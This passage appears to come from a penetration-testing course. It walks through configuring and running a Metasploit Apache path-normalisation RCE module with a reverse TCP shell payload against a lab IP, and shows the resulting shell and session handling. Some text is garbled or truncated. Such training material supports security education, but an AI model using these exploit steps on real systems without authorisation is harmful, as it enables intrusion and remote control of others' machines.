## Activate exploit module and show its information

The output contains several important pieces of information in the context of this exploitit module. Before we select our target and run an exploit module, we should always understand what the module is doing by reviewing the information. The output starts with general information about the exploit such as the name, platform, and architecture.

The output also contains information about potential side effects of running this module, such as indicators of compromise entries in log solutions, and, in this example, artifacts on disk. This and module stability help predict if we can crash a target system or what information defenders may obtain from using this exploit module.

The reliability determines if we can run the exploit more than once. In our example, the output repeatable-session. This is important as some exploits will only work once.

The Targets area of the output commonly contains target specifications of vulnerable targets by the exploit module. These targets range from different operating systems and application versions to command execution methods. Modules provide the Automatic target, which Metasploit tries to identify by itself or by using the default operation specified by the module.

Check supported determines if we can use the check command to dry-run the exploit module and confirm if a target is vulnerable before we actually attempt to exploit it.

Description provides us a text-based explanation of the module's purpose. According to the output of this module description, it seems to be the correct method for the vulnerability identified by the hypothetical vulnerability scan.

Now that we have an understanding of what the exploit module does and what implications the execution execution of it has, we can display its options.

## Display the options for the exploit module

The options shown in Listing 643 are the options available for the auxiliary modules from the previous section. However, for exploit modules, there is an additional section named Payload options. If we don't set this, this module will select a default payload. The default payload may not be what we want or expect, so it's better to set our options explicitly to maintain control of the exploitation process. We'll cover different payloads in the next, but for now we need to set it to a reverse shell. We can select a payload with set payload and the name linux/x64/shell_reverse_tcp. In addition, we set the IP address of our Kali machine for LHOST.

msf6 exploit(multi/http/apache_normalize_path_rce) > set payload linux/x64/shell_reverse_tcp
payload => linux/x64/shell_reverse_tcp

msf6 exploit(multi/http/apache_normalize_path_rce) > show options

## Set payload of the exploit module

The output shows that the entered payload is now active for the exploit module. There are two options for the payload named LHOST (the local IP address or interface) and LPORT (the local port), which are used for the reverse shell connection. By default, most modules use the port 4444 in the LPORT option. Depending on our machine configuration, Metasploit may already set the LHOST value for us. We should always double-check this value especially if our machine contains multiple interfaces, because Metasploit may reference the wrong interface to set this value. In penetration tests we may face the situation that port 4444 is blocked by firewalls or other security technologies. This is common as the default for Metasploit modules. In this like changing the port number to ports associated with commonly used protocols such as HTTP or HTTPS may lead to successful execution of the selected payload. Note that we don't need to start a listener manually with tools like Netcat to receive the incoming shell; Metasploit automatically sets a listener matching the specified payload. Now let's set the options SSL to false and RPORT to 80 since the target server runs without HTTP. Then we set RHOSTS to the target IP and run.

msf6 exploit(multi/http/apache_normalize_path_r) > set SSL false
SSL => false

msf6 exploit(multi/http/apache_normalize_path_r) > set RPORT 80
RPORT => 80

msf6 exploit(multi/http/apache_normalize_path_r) > set RHOSTS 192.168.50.16
RHOSTS => 192.168.50.16

## Running the exploit module

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)

Once launched, the exploit module first starts a listener on port 4444 and uses the previously auxiliary module to check if the target is vulnerable. In our case, it is vulnerable as shown in Listing 645. Then, the vulnerability is exploited and the payload is sent. The console states that a session is opened, and we obtained command execution.

Before we head to the next section, let's explore the concept of sessions and jobs in Metasploit. Sessions are used to interact and manage access to successfully exploited targets, while jobs are used to run modules or features in the background.

When we launched the exploit with run, a session was created and we obtained an interactive shell. We can send the session to the background by pressing Ctrl+Z and confirming the prompt. The session is sent to the background, we can use sessions -l to list all active sessions.

^+Z
Background session 2? [y/N] y
